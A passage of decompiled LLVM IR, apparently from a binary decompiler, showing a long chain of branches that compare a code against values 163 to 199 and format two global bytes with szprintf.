  %v3_d04c = load i8, i8* @global_var_299ba.79, align 1
  %v4_d058 = sext i8 %v3_d040 to i32
  %v6_d058 = sext i8 %v3_d04c to i32
  %v8_d058 = call i32 @szprintf(i32 %v2_d034, i32 ptrtoint ([14 x i8]* @global_var_1f27c.390 to i32), i32 %v4_d058, i32 %v6_d058, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d05c

dec_label_pc_d05c:                                ; preds = %dec_label_pc_d028, %dec_label_pc_d034
  %v7_d060 = icmp eq i32 %v2_acd8, 163
  br i1 %v7_d060, label %dec_label_pc_d068, label %dec_label_pc_d090

dec_label_pc_d068:                                ; preds = %dec_label_pc_d05c
  %v2_d068 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d074 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d080 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d08c = sext i8 %v3_d074 to i32
  %v6_d08c = sext i8 %v3_d080 to i32
  %v8_d08c = call i32 @szprintf(i32 %v2_d068, i32 ptrtoint ([14 x i8]* @global_var_1f28c.392 to i32), i32 %v4_d08c, i32 %v6_d08c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d090

dec_label_pc_d090:                                ; preds = %dec_label_pc_d05c, %dec_label_pc_d068
  %v7_d094 = icmp eq i32 %v2_acd8, 164
  br i1 %v7_d094, label %dec_label_pc_d09c, label %dec_label_pc_d0c4

dec_label_pc_d09c:                                ; preds = %dec_label_pc_d090
  %v2_d09c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d0a8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d0b4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d0c0 = sext i8 %v3_d0a8 to i32
  %v6_d0c0 = sext i8 %v3_d0b4 to i32
  %v8_d0c0 = call i32 @szprintf(i32 %v2_d09c, i32 ptrtoint ([14 x i8]* @global_var_1f1e0.369 to i32), i32 %v4_d0c0, i32 %v6_d0c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0c4

dec_label_pc_d0c4:                                ; preds = %dec_label_pc_d090, %dec_label_pc_d09c
  %v7_d0c8 = icmp eq i32 %v2_acd8, 165
  br i1 %v7_d0c8, label %dec_label_pc_d0d0, label %dec_label_pc_d0f8

dec_label_pc_d0d0:                                ; preds = %dec_label_pc_d0c4
  %v2_d0d0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d0dc = load i8, i8* @global_var_299b9.78, align 1
  %v3_d0e8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d0f4 = sext i8 %v3_d0dc to i32
  %v6_d0f4 = sext i8 %v3_d0e8 to i32
  %v8_d0f4 = call i32 @szprintf(i32 %v2_d0d0, i32 ptrtoint ([14 x i8]* @global_var_1f29c.394 to i32), i32 %v4_d0f4, i32 %v6_d0f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d0f8

dec_label_pc_d0f8:                                ; preds = %dec_label_pc_d0c4, %dec_label_pc_d0d0
  %v7_d0fc = icmp eq i32 %v2_acd8, 166
  br i1 %v7_d0fc, label %dec_label_pc_d104, label %dec_label_pc_d12c

dec_label_pc_d104:                                ; preds = %dec_label_pc_d0f8
  %v2_d104 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d110 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d11c = load i8, i8* @global_var_299ba.79, align 1
  %v4_d128 = sext i8 %v3_d110 to i32
  %v6_d128 = sext i8 %v3_d11c to i32
  %v8_d128 = call i32 @szprintf(i32 %v2_d104, i32 ptrtoint ([14 x i8]* @global_var_1f2ac.396 to i32), i32 %v4_d128, i32 %v6_d128, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d12c

dec_label_pc_d12c:                                ; preds = %dec_label_pc_d0f8, %dec_label_pc_d104
  %v7_d130 = icmp eq i32 %v2_acd8, 167
  br i1 %v7_d130, label %dec_label_pc_d138, label %dec_label_pc_d160

dec_label_pc_d138:                                ; preds = %dec_label_pc_d12c
  %v2_d138 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d144 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d150 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d15c = sext i8 %v3_d144 to i32
  %v6_d15c = sext i8 %v3_d150 to i32
  %v8_d15c = call i32 @szprintf(i32 %v2_d138, i32 ptrtoint ([14 x i8]* @global_var_1f24c.384 to i32), i32 %v4_d15c, i32 %v6_d15c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d160

dec_label_pc_d160:                                ; preds = %dec_label_pc_d12c, %dec_label_pc_d138
  %v7_d164 = icmp eq i32 %v2_acd8, 168
  br i1 %v7_d164, label %dec_label_pc_d16c, label %dec_label_pc_d194

dec_label_pc_d16c:                                ; preds = %dec_label_pc_d160
  %v2_d16c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d178 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d184 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d190 = sext i8 %v3_d178 to i32
  %v6_d190 = sext i8 %v3_d184 to i32
  %v8_d190 = call i32 @szprintf(i32 %v2_d16c, i32 ptrtoint ([15 x i8]* @global_var_1f2bc.398 to i32), i32 %v4_d190, i32 %v6_d190, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d194

dec_label_pc_d194:                                ; preds = %dec_label_pc_d160, %dec_label_pc_d16c
  %v7_d198 = icmp eq i32 %v2_acd8, 169
  br i1 %v7_d198, label %dec_label_pc_d1a0, label %dec_label_pc_d1c8

dec_label_pc_d1a0:                                ; preds = %dec_label_pc_d194
  %v2_d1a0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d1ac = load i8, i8* @global_var_299b9.78, align 1
  %v3_d1b8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d1c4 = sext i8 %v3_d1ac to i32
  %v6_d1c4 = sext i8 %v3_d1b8 to i32
  %v8_d1c4 = call i32 @szprintf(i32 %v2_d1a0, i32 ptrtoint ([14 x i8]* @global_var_1f2cc.400 to i32), i32 %v4_d1c4, i32 %v6_d1c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1c8

dec_label_pc_d1c8:                                ; preds = %dec_label_pc_d194, %dec_label_pc_d1a0
  %v7_d1cc = icmp eq i32 %v2_acd8, 171
  br i1 %v7_d1cc, label %dec_label_pc_d1d4, label %dec_label_pc_d1fc

dec_label_pc_d1d4:                                ; preds = %dec_label_pc_d1c8
  %v2_d1d4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d1e0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d1ec = load i8, i8* @global_var_299ba.79, align 1
  %v4_d1f8 = sext i8 %v3_d1e0 to i32
  %v6_d1f8 = sext i8 %v3_d1ec to i32
  %v8_d1f8 = call i32 @szprintf(i32 %v2_d1d4, i32 ptrtoint ([14 x i8]* @global_var_1f2dc.402 to i32), i32 %v4_d1f8, i32 %v6_d1f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d1fc

dec_label_pc_d1fc:                                ; preds = %dec_label_pc_d1c8, %dec_label_pc_d1d4
  %v7_d200 = icmp eq i32 %v2_acd8, 172
  br i1 %v7_d200, label %dec_label_pc_d208, label %dec_label_pc_d230

dec_label_pc_d208:                                ; preds = %dec_label_pc_d1fc
  %v2_d208 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d214 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d220 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d22c = sext i8 %v3_d214 to i32
  %v6_d22c = sext i8 %v3_d220 to i32
  %v8_d22c = call i32 @szprintf(i32 %v2_d208, i32 ptrtoint ([14 x i8]* @global_var_1f2ec.404 to i32), i32 %v4_d22c, i32 %v6_d22c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d230

dec_label_pc_d230:                                ; preds = %dec_label_pc_d1fc, %dec_label_pc_d208
  %v7_d234 = icmp eq i32 %v2_acd8, 173
  br i1 %v7_d234, label %dec_label_pc_d23c, label %dec_label_pc_d264

dec_label_pc_d23c:                                ; preds = %dec_label_pc_d230
  %v2_d23c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d248 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d254 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d260 = sext i8 %v3_d248 to i32
  %v6_d260 = sext i8 %v3_d254 to i32
  %v8_d260 = call i32 @szprintf(i32 %v2_d23c, i32 ptrtoint ([14 x i8]* @global_var_1f2fc.406 to i32), i32 %v4_d260, i32 %v6_d260, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d264

dec_label_pc_d264:                                ; preds = %dec_label_pc_d230, %dec_label_pc_d23c
  %v7_d268 = icmp eq i32 %v2_acd8, 174
  br i1 %v7_d268, label %dec_label_pc_d270, label %dec_label_pc_d298

dec_label_pc_d270:                                ; preds = %dec_label_pc_d264
  %v2_d270 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d27c = load i8, i8* @global_var_299b9.78, align 1
  %v3_d288 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d294 = sext i8 %v3_d27c to i32
  %v6_d294 = sext i8 %v3_d288 to i32
  %v8_d294 = call i32 @szprintf(i32 %v2_d270, i32 ptrtoint ([13 x i8]* @global_var_1f30c.408 to i32), i32 %v4_d294, i32 %v6_d294, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d298

dec_label_pc_d298:                                ; preds = %dec_label_pc_d264, %dec_label_pc_d270
  %v7_d29c = icmp eq i32 %v2_acd8, 175
  br i1 %v7_d29c, label %dec_label_pc_d2a4, label %dec_label_pc_d2cc

dec_label_pc_d2a4:                                ; preds = %dec_label_pc_d298
  %v2_d2a4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d2b0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d2bc = load i8, i8* @global_var_299ba.79, align 1
  %v4_d2c8 = sext i8 %v3_d2b0 to i32
  %v6_d2c8 = sext i8 %v3_d2bc to i32
  %v8_d2c8 = call i32 @szprintf(i32 %v2_d2a4, i32 ptrtoint ([14 x i8]* @global_var_1f31c.410 to i32), i32 %v4_d2c8, i32 %v6_d2c8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d2cc

dec_label_pc_d2cc:                                ; preds = %dec_label_pc_d298, %dec_label_pc_d2a4
  %v7_d2d0 = icmp eq i32 %v2_acd8, 176
  br i1 %v7_d2d0, label %dec_label_pc_d2d8, label %dec_label_pc_d300

dec_label_pc_d2d8:                                ; preds = %dec_label_pc_d2cc
  %v2_d2d8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d2e4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d2f0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d2fc = sext i8 %v3_d2e4 to i32
  %v6_d2fc = sext i8 %v3_d2f0 to i32
  %v8_d2fc = call i32 @szprintf(i32 %v2_d2d8, i32 ptrtoint ([14 x i8]* @global_var_1f32c.412 to i32), i32 %v4_d2fc, i32 %v6_d2fc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d300

dec_label_pc_d300:                                ; preds = %dec_label_pc_d2cc, %dec_label_pc_d2d8
  %v7_d304 = icmp eq i32 %v2_acd8, 177
  br i1 %v7_d304, label %dec_label_pc_d30c, label %dec_label_pc_d334

dec_label_pc_d30c:                                ; preds = %dec_label_pc_d300
  %v2_d30c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d318 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d324 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d330 = sext i8 %v3_d318 to i32
  %v6_d330 = sext i8 %v3_d324 to i32
  %v8_d330 = call i32 @szprintf(i32 %v2_d30c, i32 ptrtoint ([14 x i8]* @global_var_1f33c.414 to i32), i32 %v4_d330, i32 %v6_d330, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d334

dec_label_pc_d334:                                ; preds = %dec_label_pc_d300, %dec_label_pc_d30c
  %v7_d338 = icmp eq i32 %v2_acd8, 178
  br i1 %v7_d338, label %dec_label_pc_d340, label %dec_label_pc_d368

dec_label_pc_d340:                                ; preds = %dec_label_pc_d334
  %v2_d340 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d34c = load i8, i8* @global_var_299b9.78, align 1
  %v3_d358 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d364 = sext i8 %v3_d34c to i32
  %v6_d364 = sext i8 %v3_d358 to i32
  %v8_d364 = call i32 @szprintf(i32 %v2_d340, i32 ptrtoint ([13 x i8]* @global_var_1f34c.416 to i32), i32 %v4_d364, i32 %v6_d364, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d368

dec_label_pc_d368:                                ; preds = %dec_label_pc_d334, %dec_label_pc_d340
  %v7_d36c = icmp eq i32 %v2_acd8, 179
  br i1 %v7_d36c, label %dec_label_pc_d374, label %dec_label_pc_d39c

dec_label_pc_d374:                                ; preds = %dec_label_pc_d368
  %v2_d374 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d380 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d38c = load i8, i8* @global_var_299ba.79, align 1
  %v4_d398 = sext i8 %v3_d380 to i32
  %v6_d398 = sext i8 %v3_d38c to i32
  %v8_d398 = call i32 @szprintf(i32 %v2_d374, i32 ptrtoint ([13 x i8]* @global_var_1f35c.418 to i32), i32 %v4_d398, i32 %v6_d398, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d39c

dec_label_pc_d39c:                                ; preds = %dec_label_pc_d368, %dec_label_pc_d374
  %v7_d3a0 = icmp eq i32 %v2_acd8, 180
  br i1 %v7_d3a0, label %dec_label_pc_d3a8, label %dec_label_pc_d3d0

dec_label_pc_d3a8:                                ; preds = %dec_label_pc_d39c
  %v2_d3a8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d3b4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d3c0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d3cc = sext i8 %v3_d3b4 to i32
  %v6_d3cc = sext i8 %v3_d3c0 to i32
  %v8_d3cc = call i32 @szprintf(i32 %v2_d3a8, i32 ptrtoint ([13 x i8]* @global_var_1f36c.420 to i32), i32 %v4_d3cc, i32 %v6_d3cc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d3d0

dec_label_pc_d3d0:                                ; preds = %dec_label_pc_d39c, %dec_label_pc_d3a8
  %v7_d3d4 = icmp eq i32 %v2_acd8, 181
  br i1 %v7_d3d4, label %dec_label_pc_d3dc, label %dec_label_pc_d404

dec_label_pc_d3dc:                                ; preds = %dec_label_pc_d3d0
  %v2_d3dc = ptrtoint i32* %stack_var_-36 to i32
  %v3_d3e8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d3f4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d400 = sext i8 %v3_d3e8 to i32
  %v6_d400 = sext i8 %v3_d3f4 to i32
  %v8_d400 = call i32 @szprintf(i32 %v2_d3dc, i32 ptrtoint ([13 x i8]* @global_var_1f37c.422 to i32), i32 %v4_d400, i32 %v6_d400, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d404

dec_label_pc_d404:                                ; preds = %dec_label_pc_d3d0, %dec_label_pc_d3dc
  %v7_d408 = icmp eq i32 %v2_acd8, 182
  br i1 %v7_d408, label %dec_label_pc_d410, label %dec_label_pc_d438

dec_label_pc_d410:                                ; preds = %dec_label_pc_d404
  %v2_d410 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d41c = load i8, i8* @global_var_299b9.78, align 1
  %v3_d428 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d434 = sext i8 %v3_d41c to i32
  %v6_d434 = sext i8 %v3_d428 to i32
  %v8_d434 = call i32 @szprintf(i32 %v2_d410, i32 ptrtoint ([13 x i8]* @global_var_1f38c.424 to i32), i32 %v4_d434, i32 %v6_d434, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d438

dec_label_pc_d438:                                ; preds = %dec_label_pc_d404, %dec_label_pc_d410
  %v7_d43c = icmp eq i32 %v2_acd8, 183
  br i1 %v7_d43c, label %dec_label_pc_d444, label %dec_label_pc_d46c

dec_label_pc_d444:                                ; preds = %dec_label_pc_d438
  %v2_d444 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d450 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d45c = load i8, i8* @global_var_299ba.79, align 1
  %v4_d468 = sext i8 %v3_d450 to i32
  %v6_d468 = sext i8 %v3_d45c to i32
  %v8_d468 = call i32 @szprintf(i32 %v2_d444, i32 ptrtoint ([13 x i8]* @global_var_1eba8.167 to i32), i32 %v4_d468, i32 %v6_d468, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d46c

dec_label_pc_d46c:                                ; preds = %dec_label_pc_d438, %dec_label_pc_d444
  %v7_d470 = icmp eq i32 %v2_acd8, 184
  br i1 %v7_d470, label %dec_label_pc_d478, label %dec_label_pc_d4a0

dec_label_pc_d478:                                ; preds = %dec_label_pc_d46c
  %v2_d478 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d484 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d490 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d49c = sext i8 %v3_d484 to i32
  %v6_d49c = sext i8 %v3_d490 to i32
  %v8_d49c = call i32 @szprintf(i32 %v2_d478, i32 ptrtoint ([13 x i8]* @global_var_1f39c.427 to i32), i32 %v4_d49c, i32 %v6_d49c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d4a0

dec_label_pc_d4a0:                                ; preds = %dec_label_pc_d46c, %dec_label_pc_d478
  %v7_d4a4 = icmp eq i32 %v2_acd8, 185
  br i1 %v7_d4a4, label %dec_label_pc_d4ac, label %dec_label_pc_d4d4

dec_label_pc_d4ac:                                ; preds = %dec_label_pc_d4a0
  %v2_d4ac = ptrtoint i32* %stack_var_-36 to i32
  %v3_d4b8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d4c4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d4d0 = sext i8 %v3_d4b8 to i32
  %v6_d4d0 = sext i8 %v3_d4c4 to i32
  %v8_d4d0 = call i32 @szprintf(i32 %v2_d4ac, i32 ptrtoint ([13 x i8]* @global_var_1f3ac.429 to i32), i32 %v4_d4d0, i32 %v6_d4d0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d4d4

dec_label_pc_d4d4:                                ; preds = %dec_label_pc_d4a0, %dec_label_pc_d4ac
  %v7_d4d8 = icmp eq i32 %v2_acd8, 186
  br i1 %v7_d4d8, label %dec_label_pc_d4e0, label %dec_label_pc_d508

dec_label_pc_d4e0:                                ; preds = %dec_label_pc_d4d4
  %v2_d4e0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d4ec = load i8, i8* @global_var_299b9.78, align 1
  %v3_d4f8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d504 = sext i8 %v3_d4ec to i32
  %v6_d504 = sext i8 %v3_d4f8 to i32
  %v8_d504 = call i32 @szprintf(i32 %v2_d4e0, i32 ptrtoint ([14 x i8]* @global_var_1f3bc.431 to i32), i32 %v4_d504, i32 %v6_d504, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d508

dec_label_pc_d508:                                ; preds = %dec_label_pc_d4d4, %dec_label_pc_d4e0
  %v7_d50c = icmp eq i32 %v2_acd8, 187
  br i1 %v7_d50c, label %dec_label_pc_d514, label %dec_label_pc_d53c

dec_label_pc_d514:                                ; preds = %dec_label_pc_d508
  %v2_d514 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d520 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d52c = load i8, i8* @global_var_299ba.79, align 1
  %v4_d538 = sext i8 %v3_d520 to i32
  %v6_d538 = sext i8 %v3_d52c to i32
  %v8_d538 = call i32 @szprintf(i32 %v2_d514, i32 ptrtoint ([14 x i8]* @global_var_1f3cc.433 to i32), i32 %v4_d538, i32 %v6_d538, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d53c

dec_label_pc_d53c:                                ; preds = %dec_label_pc_d508, %dec_label_pc_d514
  %v7_d540 = icmp eq i32 %v2_acd8, 188
  br i1 %v7_d540, label %dec_label_pc_d548, label %dec_label_pc_d570

dec_label_pc_d548:                                ; preds = %dec_label_pc_d53c
  %v2_d548 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d554 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d560 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d56c = sext i8 %v3_d554 to i32
  %v6_d56c = sext i8 %v3_d560 to i32
  %v8_d56c = call i32 @szprintf(i32 %v2_d548, i32 ptrtoint ([14 x i8]* @global_var_1f3cc.433 to i32), i32 %v4_d56c, i32 %v6_d56c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d570

dec_label_pc_d570:                                ; preds = %dec_label_pc_d53c, %dec_label_pc_d548
  %v7_d574 = icmp eq i32 %v2_acd8, 189
  br i1 %v7_d574, label %dec_label_pc_d57c, label %dec_label_pc_d5a4

dec_label_pc_d57c:                                ; preds = %dec_label_pc_d570
  %v2_d57c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d588 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d594 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d5a0 = sext i8 %v3_d588 to i32
  %v6_d5a0 = sext i8 %v3_d594 to i32
  %v8_d5a0 = call i32 @szprintf(i32 %v2_d57c, i32 ptrtoint ([14 x i8]* @global_var_1f3dc.435 to i32), i32 %v4_d5a0, i32 %v6_d5a0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d5a4

dec_label_pc_d5a4:                                ; preds = %dec_label_pc_d570, %dec_label_pc_d57c
  %v7_d5a8 = icmp eq i32 %v2_acd8, 190
  br i1 %v7_d5a8, label %dec_label_pc_d5b0, label %dec_label_pc_d5d8

dec_label_pc_d5b0:                                ; preds = %dec_label_pc_d5a4
  %v2_d5b0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d5bc = load i8, i8* @global_var_299b9.78, align 1
  %v3_d5c8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d5d4 = sext i8 %v3_d5bc to i32
  %v6_d5d4 = sext i8 %v3_d5c8 to i32
  %v8_d5d4 = call i32 @szprintf(i32 %v2_d5b0, i32 ptrtoint ([14 x i8]* @global_var_1f3ec.437 to i32), i32 %v4_d5d4, i32 %v6_d5d4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d5d8

dec_label_pc_d5d8:                                ; preds = %dec_label_pc_d5a4, %dec_label_pc_d5b0
  %v7_d5dc = icmp eq i32 %v2_acd8, 191
  br i1 %v7_d5dc, label %dec_label_pc_d5e4, label %dec_label_pc_d60c

dec_label_pc_d5e4:                                ; preds = %dec_label_pc_d5d8
  %v2_d5e4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d5f0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d5fc = load i8, i8* @global_var_299ba.79, align 1
  %v4_d608 = sext i8 %v3_d5f0 to i32
  %v6_d608 = sext i8 %v3_d5fc to i32
  %v8_d608 = call i32 @szprintf(i32 %v2_d5e4, i32 ptrtoint ([14 x i8]* @global_var_1f3fc.439 to i32), i32 %v4_d608, i32 %v6_d608, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d60c

dec_label_pc_d60c:                                ; preds = %dec_label_pc_d5d8, %dec_label_pc_d5e4
  %v7_d610 = icmp eq i32 %v2_acd8, 192
  br i1 %v7_d610, label %dec_label_pc_d618, label %dec_label_pc_d640

dec_label_pc_d618:                                ; preds = %dec_label_pc_d60c
  %v2_d618 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d624 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d630 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d63c = sext i8 %v3_d624 to i32
  %v6_d63c = sext i8 %v3_d630 to i32
  %v8_d63c = call i32 @szprintf(i32 %v2_d618, i32 ptrtoint ([13 x i8]* @global_var_1f40c.441 to i32), i32 %v4_d63c, i32 %v6_d63c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d640

dec_label_pc_d640:                                ; preds = %dec_label_pc_d60c, %dec_label_pc_d618
  %v7_d644 = icmp eq i32 %v2_acd8, 193
  br i1 %v7_d644, label %dec_label_pc_d64c, label %dec_label_pc_d674

dec_label_pc_d64c:                                ; preds = %dec_label_pc_d640
  %v2_d64c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d658 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d664 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d670 = sext i8 %v3_d658 to i32
  %v6_d670 = sext i8 %v3_d664 to i32
  %v8_d670 = call i32 @szprintf(i32 %v2_d64c, i32 ptrtoint ([13 x i8]* @global_var_1f41c.443 to i32), i32 %v4_d670, i32 %v6_d670, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d674

dec_label_pc_d674:                                ; preds = %dec_label_pc_d640, %dec_label_pc_d64c
  %v7_d678 = icmp eq i32 %v2_acd8, 194
  br i1 %v7_d678, label %dec_label_pc_d680, label %dec_label_pc_d6a8

dec_label_pc_d680:                                ; preds = %dec_label_pc_d674
  %v2_d680 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d68c = load i8, i8* @global_var_299b9.78, align 1
  %v3_d698 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d6a4 = sext i8 %v3_d68c to i32
  %v6_d6a4 = sext i8 %v3_d698 to i32
  %v8_d6a4 = call i32 @szprintf(i32 %v2_d680, i32 ptrtoint ([14 x i8]* @global_var_1f42c.445 to i32), i32 %v4_d6a4, i32 %v6_d6a4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d6a8

dec_label_pc_d6a8:                                ; preds = %dec_label_pc_d674, %dec_label_pc_d680
  %v7_d6ac = icmp eq i32 %v2_acd8, 195
  br i1 %v7_d6ac, label %dec_label_pc_d6b4, label %dec_label_pc_d6dc

dec_label_pc_d6b4:                                ; preds = %dec_label_pc_d6a8
  %v2_d6b4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d6c0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d6cc = load i8, i8* @global_var_299ba.79, align 1
  %v4_d6d8 = sext i8 %v3_d6c0 to i32
  %v6_d6d8 = sext i8 %v3_d6cc to i32
  %v8_d6d8 = call i32 @szprintf(i32 %v2_d6b4, i32 ptrtoint ([17 x i8]* @global_var_1f43c.447 to i32), i32 %v4_d6d8, i32 %v6_d6d8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d6dc

dec_label_pc_d6dc:                                ; preds = %dec_label_pc_d6a8, %dec_label_pc_d6b4
  %v7_d6e0 = icmp eq i32 %v2_acd8, 196
  br i1 %v7_d6e0, label %dec_label_pc_d6e8, label %dec_label_pc_d710

dec_label_pc_d6e8:                                ; preds = %dec_label_pc_d6dc
  %v2_d6e8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d6f4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d700 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d70c = sext i8 %v3_d6f4 to i32
  %v6_d70c = sext i8 %v3_d700 to i32
  %v8_d70c = call i32 @szprintf(i32 %v2_d6e8, i32 ptrtoint ([16 x i8]* @global_var_1f450.449 to i32), i32 %v4_d70c, i32 %v6_d70c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d710

dec_label_pc_d710:                                ; preds = %dec_label_pc_d6dc, %dec_label_pc_d6e8
  %v7_d714 = icmp eq i32 %v2_acd8, 197
  br i1 %v7_d714, label %dec_label_pc_d71c, label %dec_label_pc_d744

dec_label_pc_d71c:                                ; preds = %dec_label_pc_d710
  %v2_d71c = ptrtoint i32* %stack_var_-36 to i32
  %v3_d728 = load i8, i8* @global_var_299b9.78, align 1
  %v3_d734 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d740 = sext i8 %v3_d728 to i32
  %v6_d740 = sext i8 %v3_d734 to i32
  %v8_d740 = call i32 @szprintf(i32 %v2_d71c, i32 ptrtoint ([15 x i8]* @global_var_1f024.312 to i32), i32 %v4_d740, i32 %v6_d740, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d744

dec_label_pc_d744:                                ; preds = %dec_label_pc_d710, %dec_label_pc_d71c
  %v7_d748 = icmp eq i32 %v2_acd8, 198
  br i1 %v7_d748, label %dec_label_pc_d750, label %dec_label_pc_d778

dec_label_pc_d750:                                ; preds = %dec_label_pc_d744
  %v2_d750 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d75c = load i8, i8* @global_var_299b9.78, align 1
  %v3_d768 = load i8, i8* @global_var_299ba.79, align 1
  %v4_d774 = sext i8 %v3_d75c to i32
  %v6_d774 = sext i8 %v3_d768 to i32
  %v8_d774 = call i32 @szprintf(i32 %v2_d750, i32 ptrtoint ([15 x i8]* @global_var_1f460.452 to i32), i32 %v4_d774, i32 %v6_d774, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_d778

dec_label_pc_d778:                                ; preds = %dec_label_pc_d744, %dec_label_pc_d750
  %v7_d77c = icmp eq i32 %v2_acd8, 199
  br i1 %v7_d77c, label %dec_label_pc_d784, label %dec_label_pc_d7ac

dec_label_pc_d784:                                ; preds = %dec_label_pc_d778
  %v2_d784 = ptrtoint i32* %stack_var_-36 to i32
  %v3_d790 = load i8, i8* @global_var_299b9.78, align 1
